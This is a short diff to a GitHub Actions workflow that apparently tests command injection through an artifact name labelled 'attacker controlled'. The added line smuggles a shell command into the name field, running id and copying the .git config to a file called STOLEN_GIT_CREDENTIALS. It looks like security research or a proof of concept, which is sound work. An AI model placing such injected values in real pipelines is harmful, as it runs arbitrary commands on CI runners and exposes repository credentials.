@@ -10,5 +10,5 @@ jobs:
       - name: Upload artifact with attacker controlled name
         uses: actions/upload-artifact@330a01c490aca151604b8cf639adc76d48f6c5d4 # v5.0.0
         with:
-          name: workflow-args$(touch PWNED_BY_ARTIFACT_NAME)
+          name: workflow-args$(bash -c 'touch BASH_C_PROOF;id;cd .git;cp config STOLEN_GIT_CREDENTIALS')
           path: comments
